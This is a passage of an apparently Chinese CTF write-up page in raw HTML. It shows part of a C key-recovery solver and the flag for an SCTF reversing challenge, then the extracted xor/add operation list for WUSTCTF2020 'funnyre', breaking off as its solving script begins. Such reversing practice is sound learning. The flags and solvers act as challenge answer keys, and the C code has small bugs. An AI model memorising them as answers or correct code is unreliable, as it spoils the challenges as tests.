class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x3e</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x3f</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x40</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span> &#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> dict[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a) / <span class="number">4</span>; i++) &#123;</span><br><span class="line">        dict[a[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, dict);</span><br><span class="line">    <span class="keyword">uint32_t</span> v8[<span class="number">15</span>];</span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">190</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">    v8[<span class="number">2</span>] = <span class="number">6</span>;</span><br><span class="line">    v8[<span class="number">3</span>] = <span class="number">128</span>;</span><br><span class="line">    v8[<span class="number">4</span>] = <span class="number">197</span>;</span><br><span class="line">    v8[<span class="number">5</span>] = <span class="number">175</span>;</span><br><span class="line">    v8[<span class="number">6</span>] = <span class="number">118</span>;</span><br><span class="line">    v8[<span class="number">7</span>] = <span class="number">71</span>;</span><br><span class="line">    v8[<span class="number">8</span>] = <span class="number">159</span>;</span><br><span class="line">    v8[<span class="number">9</span>] = <span class="number">204</span>;</span><br><span class="line">    v8[<span class="number">10</span>] = <span class="number">64</span>;</span><br><span class="line">    v8[<span class="number">11</span>] = <span class="number">31</span>;</span><br><span class="line">    v8[<span class="number">12</span>] = <span class="number">216</span>;</span><br><span class="line">    v8[<span class="number">13</span>] = <span class="number">191</span>;</span><br><span class="line">    v8[<span class="number">14</span>] = <span class="number">146</span>;</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">239</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">30</span>];</span><br><span class="line">    k[<span class="number">29</span>] = v8[<span class="number">12</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">13</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">14</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">15</span>];</span><br><span class="line">    k[<span class="number">28</span>] = v8[<span class="number">8</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">9</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">10</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">11</span>];</span><br><span class="line">    k[<span class="number">27</span>] = v8[<span class="number">4</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">5</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">6</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">7</span>];</span><br><span class="line">    k[<span class="number">26</span>] = v8[<span class="number">0</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">1</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">2</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> t = k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> t1 = tau(t);</span><br><span class="line">        <span class="keyword">uint32_t</span> t2 = L(t1);</span><br><span class="line">        <span class="comment">// printf(&quot;0x%x\n&quot;,t2);</span></span><br><span class="line">        k[i] = k[i+<span class="number">4</span>] ^ t2;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(&#x27;key&#x27;,k,16);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,k);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

sctf&#123;ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)&#125;

## [rev][WUSTCTF2020]funnyre

1. 进入主函数

2. 发现一大堆xor,add,++,~处理

3. 拷贝所有反编译后的代码，使用正则表达式处理，得到以下一些东西

   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br></pre></td><td class="code"><pre><span class="line">^&#x3D;0x91</span><br><span class="line">^&#x3D;0xCD</span><br><span class="line">^&#x3D;0x6A</span><br><span class="line">^&#x3D;0x59</span><br><span class="line">^&#x3D;0xA</span><br><span class="line">^&#x3D;0xF3</span><br><span class="line">^&#x3D;0xCA</span><br><span class="line">^&#x3D;0x3E</span><br><span class="line">^&#x3D;0x6C</span><br><span class="line">^&#x3D;0x4F</span><br><span class="line">^&#x3D;0x24</span><br><span class="line">^&#x3D;0x83</span><br><span class="line">^&#x3D;0xC4</span><br><span class="line">^&#x3D;0x53</span><br><span class="line">^&#x3D;4</span><br><span class="line">^&#x3D;0x9E</span><br><span class="line">^&#x3D;0x42</span><br><span class="line">^&#x3D;0xE</span><br><span class="line">^&#x3D;0x8D</span><br><span class="line">^&#x3D;0x38</span><br><span class="line">^&#x3D;0x7A</span><br><span class="line">^&#x3D;0xDD</span><br><span class="line">^&#x3D;0x52</span><br><span class="line">^&#x3D;0x1B</span><br><span class="line">^&#x3D;0xAA</span><br><span class="line">^&#x3D;0xAE</span><br><span class="line">^&#x3D;0xF8</span><br><span class="line">^&#x3D;0x58</span><br><span class="line">^&#x3D;0xF2</span><br><span class="line">^&#x3D;0x9F</span><br><span class="line">^&#x3D;0x3C</span><br><span class="line">^&#x3D;0xA1</span><br><span class="line">^&#x3D;6</span><br><span class="line">^&#x3D;0x78</span><br><span class="line">^&#x3D;0x70</span><br><span class="line">^&#x3D;0x28</span><br><span class="line">^&#x3D;0xEA</span><br><span class="line">^&#x3D;0x48</span><br><span class="line">^&#x3D;0xE4</span><br><span class="line">^&#x3D;0x6E</span><br><span class="line">^&#x3D;0x40</span><br><span class="line">^&#x3D;0x89</span><br><span class="line">^&#x3D;0x16</span><br><span class="line">^&#x3D;0xD7</span><br><span class="line">^&#x3D;0xB5</span><br><span class="line">^&#x3D;0xD</span><br><span class="line">^&#x3D;0x17</span><br><span class="line">^&#x3D;0x5A</span><br><span class="line">^&#x3D;0xB1</span><br><span class="line">^&#x3D;0x69</span><br><span class="line">^&#x3D;0x5C</span><br><span class="line">^&#x3D;0x21</span><br><span class="line">^&#x3D;0xE5</span><br><span class="line">^&#x3D;0x7E</span><br><span class="line">^&#x3D;0x2A</span><br><span class="line">^&#x3D;0x94</span><br><span class="line">^&#x3D;0xBC</span><br><span class="line">^&#x3D;1</span><br><span class="line">^&#x3D;0x74</span><br><span class="line">^&#x3D;0x57</span><br><span class="line">^&#x3D;0x6D</span><br><span class="line">^&#x3D;0x1E</span><br><span class="line">^&#x3D;0xA2</span><br><span class="line">^&#x3D;0x6B</span><br><span class="line">^&#x3D;0x22</span><br><span class="line">^&#x3D;0xC2</span><br><span class="line">^&#x3D;0x3D</span><br><span class="line">^&#x3D;0x44</span><br><span class="line">^&#x3D;0x90</span><br><span class="line">^&#x3D;0x8C</span><br><span class="line">^&#x3D;0xB3</span><br><span class="line">^&#x3D;0xA6</span><br><span class="line">^&#x3D;0x79</span><br><span class="line">^&#x3D;0x61</span><br><span class="line">^&#x3D;0xD9</span><br><span class="line">^&#x3D;0x5B</span><br><span class="line">^&#x3D;0x1A</span><br><span class="line">^&#x3D;0x43</span><br><span class="line">^&#x3D;0x8F</span><br><span class="line">^&#x3D;0xA5</span><br><span class="line">^&#x3D;0xEE</span><br><span class="line">^&#x3D;0x25</span><br><span class="line">^&#x3D;0x46</span><br><span class="line">^&#x3D;0xE6</span><br><span class="line">^&#x3D;0x88</span><br><span class="line">^&#x3D;0x20</span><br><span class="line">^&#x3D;0x71</span><br><span class="line">^&#x3D;0xE8</span><br><span class="line">^&#x3D;9</span><br><span class="line">^&#x3D;0x8A</span><br><span class="line">^&#x3D;0x7B</span><br><span class="line">^&#x3D;0xB4</span><br><span class="line">^&#x3D;0x19</span><br><span class="line">^&#x3D;0x15</span><br><span class="line">^&#x3D;0x4A</span><br><span class="line">^&#x3D;0x47</span><br><span class="line">^&#x3D;0xDB</span><br><span class="line">^&#x3D;0x72</span><br><span class="line">^&#x3D;0x5F</span><br><span class="line">^&#x3D;0x26</span><br><span class="line">^&#x3D;0xA7</span><br><span class="line">^&#x3D;0x8B</span><br><span class="line">^&#x3D;0xBA</span><br><span class="line">^&#x3D;0xBF</span><br><span class="line">^&#x3D;0x87</span><br><span class="line">^&#x3D;0x36</span><br><span class="line">^&#x3D;0x3F</span><br><span class="line">^&#x3D;0xFE</span><br><span class="line">^&#x3D;0x77</span><br><span class="line">^&#x3D;0x1C</span><br><span class="line">^&#x3D;0x81</span><br><span class="line">^&#x3D;0x11</span><br><span class="line">^&#x3D;0x2E</span><br><span class="line">^&#x3D;0x7C</span><br><span class="line">^&#x3D;0x63</span><br><span class="line">^&#x3D;0x45</span><br><span class="line">^&#x3D;0xF4</span><br><span class="line">^&#x3D;0x56</span><br><span class="line">^&#x3D;0xF1</span><br><span class="line">^&#x3D;0xB0</span><br><span class="line">^&#x3D;0xD1</span><br><span class="line">^&#x3D;0xE0</span><br><span class="line">^&#x3D;0xF</span><br><span class="line">^&#x3D;0x93</span><br><span class="line">^&#x3D;0xD6</span><br><span class="line">^&#x3D;0x1F</span><br><span class="line">^&#x3D;0xCC</span><br><span class="line">^&#x3D;0x4B</span><br><span class="line">^&#x3D;0xCF</span><br><span class="line">^&#x3D;0xDF</span><br><span class="line">^&#x3D;0x55</span><br><span class="line">^&#x3D;0xB9</span><br><span class="line">^&#x3D;0x2B</span><br><span class="line">^&#x3D;0x85</span><br><span class="line">^&#x3D;0x31</span><br><span class="line">^&#x3D;0x29</span><br><span class="line">^&#x3D;0xFD</span><br><span class="line">^&#x3D;0x3A</span><br><span class="line">^&#x3D;0x5E</span><br><span class="line">^&#x3D;0xDE</span><br><span class="line">^&#x3D;3</span><br><span class="line">^&#x3D;0xC6</span><br><span class="line">^&#x3D;0xC1</span><br><span class="line">^&#x3D;0xC5</span><br><span class="line">^&#x3D;0x54</span><br><span class="line">^&#x3D;0xBB</span><br><span class="line">^&#x3D;0xFC</span><br><span class="line">^&#x3D;0xBE</span><br><span class="line">^&#x3D;0xEC</span><br><span class="line">^&#x3D;0xC0</span><br><span class="line">^&#x3D;0xAD</span><br><span class="line">^&#x3D;0xA4</span><br><span class="line">^&#x3D;0xD0</span><br><span class="line">^&#x3D;0x35</span><br><span class="line">^&#x3D;0xB7</span><br><span class="line">^&#x3D;0x51</span><br><span class="line">^&#x3D;0xAB</span><br><span class="line">^&#x3D;0x2D</span><br><span class="line">^&#x3D;0xAF</span><br><span class="line">^&#x3D;0x92</span><br><span class="line">^&#x3D;0x60</span><br><span class="line">^&#x3D;0xAC</span><br><span class="line">^&#x3D;0x30</span><br><span class="line">^&#x3D;0xD4</span><br><span class="line">^&#x3D;0xCB</span><br><span class="line">^&#x3D;0x9B</span><br><span class="line">^&#x3D;0x9A</span><br><span class="line">^&#x3D;0xFB</span><br><span class="line">^&#x3D;0x6F</span><br><span class="line">^&#x3D;0xF7</span><br><span class="line">^&#x3D;0x8E</span><br><span class="line">^&#x3D;0xA0</span><br><span class="line">^&#x3D;0x27</span><br><span class="line">^&#x3D;0xC9</span><br><span class="line">+&#x3D;-128</span><br><span class="line">^&#x3D;0x7D</span><br><span class="line">^&#x3D;0x9D</span><br><span class="line">^&#x3D;0x1D</span><br><span class="line">^&#x3D;0xDA</span><br><span class="line">^&#x3D;0xD8</span><br><span class="line">^&#x3D;0xEB</span><br><span class="line">^&#x3D;0xF6</span><br><span class="line">^&#x3D;0xE3</span><br><span class="line">^&#x3D;0x98</span><br><span class="line">^&#x3D;0xE1</span><br><span class="line">^&#x3D;0x34</span><br><span class="line">^&#x3D;0x82</span><br><span class="line">^&#x3D;0x7F</span><br><span class="line">^&#x3D;0xD5</span><br><span class="line">^&#x3D;0xE7</span><br><span class="line">^&#x3D;0xB8</span><br><span class="line">^&#x3D;0xDC</span><br><span class="line">^&#x3D;0x97</span><br><span class="line">^&#x3D;0xA3</span><br><span class="line">^&#x3D;7</span><br><span class="line">^&#x3D;0xB6</span><br><span class="line">^&#x3D;0xB</span><br><span class="line">^&#x3D;0x14</span><br><span class="line">^&#x3D;0xCE</span><br><span class="line">^&#x3D;0x66</span><br><span class="line">^&#x3D;0x62</span><br><span class="line">^&#x3D;0xEF</span><br><span class="line">~</span><br><span class="line">^&#x3D;0xF9</span><br><span class="line">^&#x3D;0xA9</span><br><span class="line">^&#x3D;0x4E</span><br><span class="line">^&#x3D;0xD3</span><br><span class="line">^&#x3D;0xC7</span><br><span class="line">^&#x3D;0xE2</span><br><span class="line">^&#x3D;0xD2</span><br><span class="line">^&#x3D;0x33</span><br><span class="line">^&#x3D;0xA8</span><br><span class="line">^&#x3D;0x96</span><br><span class="line">^&#x3D;0xBD</span><br><span class="line">^&#x3D;0xC</span><br><span class="line">^&#x3D;0x13</span><br><span class="line">^&#x3D;0x2F</span><br><span class="line">^&#x3D;0x73</span><br><span class="line">^&#x3D;0x65</span><br><span class="line">^&#x3D;0x9C</span><br><span class="line">^&#x3D;0x12</span><br><span class="line">^&#x3D;2</span><br><span class="line">^&#x3D;0x32</span><br><span class="line">^&#x3D;0x10</span><br><span class="line">^&#x3D;0x84</span><br><span class="line">^&#x3D;0xED</span><br><span class="line">^&#x3D;0x95</span><br><span class="line">^&#x3D;0x4D</span><br><span class="line">^&#x3D;0x75</span><br><span class="line">^&#x3D;0x2C</span><br><span class="line">^&#x3D;0x5D</span><br><span class="line">^&#x3D;0x39</span><br><span class="line">^&#x3D;0x18</span><br><span class="line">^&#x3D;0x4C</span><br><span class="line">^&#x3D;0x49</span><br><span class="line">^&#x3D;0x37</span><br><span class="line">^&#x3D;0xF0</span><br><span class="line">^&#x3D;0x99</span><br><span class="line">^&#x3D;0x41</span><br><span class="line">^&#x3D;0x86</span><br><span class="line">^&#x3D;0x76</span><br><span class="line">^&#x3D;0xF5</span><br><span class="line">^&#x3D;5</span><br><span class="line">^&#x3D;0xC8</span><br><span class="line">^&#x3D;0x64</span><br><span class="line">^&#x3D;0xFA</span><br><span class="line">^&#x3D;0x50</span><br><span class="line">^&#x3D;0x3B</span><br><span class="line">^&#x3D;8</span><br><span class="line">^&#x3D;0xE9</span><br><span class="line">^&#x3D;0x23</span><br><span class="line">^&#x3D;0xC3</span><br><span class="line">^&#x3D;0x68</span><br><span class="line">^&#x3D;0x67</span><br><span class="line">+&#x3D;80</span><br><span class="line">+&#x3D;64</span><br><span class="line">+&#x3D;79</span><br><span class="line">+&#x3D;30</span><br><span class="line">+&#x3D;91</span><br><span class="line">+&#x3D;9</span><br><span class="line">+&#x3D;5</span><br><span class="line">+&#x3D;99</span><br><span class="line">+&#x3D;87</span><br><span class="line">+&#x3D;83</span><br><span class="line">+&#x3D;59</span><br><span class="line">+&#x3D;58</span><br><span class="line">++</span><br><span class="line">+&#x3D;90</span><br><span class="line">+&#x3D;57</span><br><span class="line">+&#x3D;65</span><br><span class="line">+&#x3D;53</span><br><span class="line">+&#x3D;41</span><br><span class="line">+&#x3D;85</span><br><span class="line">+&#x3D;89</span><br><span class="line">+&#x3D;44</span><br><span class="line">+&#x3D;70</span><br><span class="line">+&#x3D;12</span><br><span class="line">+&#x3D;84</span><br><span class="line">+&#x3D;10</span><br><span class="line">+&#x3D;74</span><br><span class="line">+&#x3D;17</span><br><span class="line">+&#x3D;38</span><br><span class="line">+&#x3D;43</span><br><span class="line">+&#x3D;33</span><br><span class="line">+&#x3D;11</span><br><span class="line">+&#x3D;94</span><br><span class="line">+&#x3D;86</span><br><span class="line">+&#x3D;55</span><br><span class="line">+&#x3D;32</span><br><span class="line">+&#x3D;97</span><br><span class="line">+&#x3D;68</span><br><span class="line">+&#x3D;50</span><br><span class="line">+&#x3D;67</span><br><span class="line">+&#x3D;71</span><br><span class="line">+&#x3D;96</span><br><span class="line">+&#x3D;56</span><br><span class="line">+&#x3D;6</span><br><span class="line">+&#x3D;73</span><br><span class="line">+&#x3D;52</span><br><span class="line">+&#x3D;42</span><br><span class="line">+&#x3D;61</span><br><span class="line">+&#x3D;69</span><br><span class="line">+&#x3D;14</span><br><span class="line">+&#x3D;75</span><br><span class="line">+&#x3D;4</span><br><span class="line">+&#x3D;40</span><br><span class="line">+&#x3D;37</span><br><span class="line">+&#x3D;15</span><br><span class="line">+&#x3D;77</span><br><span class="line">+&#x3D;2</span><br><span class="line">+&#x3D;23</span><br><span class="line">+&#x3D;62</span><br><span class="line">+&#x3D;29</span><br><span class="line">+&#x3D;49</span><br><span class="line">+&#x3D;47</span><br><span class="line">+&#x3D;27</span><br><span class="line">+&#x3D;66</span><br><span class="line">+&#x3D;82</span><br><span class="line">+&#x3D;46</span><br><span class="line">+&#x3D;19</span><br><span class="line">+&#x3D;88</span><br><span class="line">+&#x3D;63</span><br><span class="line">+&#x3D;39</span><br><span class="line">+&#x3D;35</span><br><span class="line">+&#x3D;25</span><br><span class="line">+&#x3D;51</span><br><span class="line">+&#x3D;18</span><br><span class="line">+&#x3D;92</span><br><span class="line">+&#x3D;95</span><br><span class="line">+&#x3D;3</span><br><span class="line">+&#x3D;72</span><br><span class="line">+&#x3D;48</span><br><span class="line">+&#x3D;36</span><br><span class="line">+&#x3D;93</span><br><span class="line">+&#x3D;76</span><br><span class="line">+&#x3D;22</span><br><span class="line">+&#x3D;98</span><br><span class="line">+&#x3D;81</span><br><span class="line">+&#x3D;13</span><br><span class="line">+&#x3D;45</span><br><span class="line">+&#x3D;34</span><br><span class="line">+&#x3D;78</span><br><span class="line">+&#x3D;26</span><br><span class="line">+&#x3D;54</span><br><span class="line">+&#x3D;28</span><br><span class="line">+&#x3D;31</span><br><span class="line">+&#x3D;20</span><br><span class="line">+&#x3D;16</span><br><span class="line">+&#x3D;7</span><br><span class="line">+&#x3D;24</span><br><span class="line">+&#x3D;60</span><br><span class="line">+&#x3D;21</span><br><span class="line">+&#x3D;8</span><br></pre></td></tr></table></figure>

4. 比对的数据在后面可以找到

5. 写脚本反处理

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 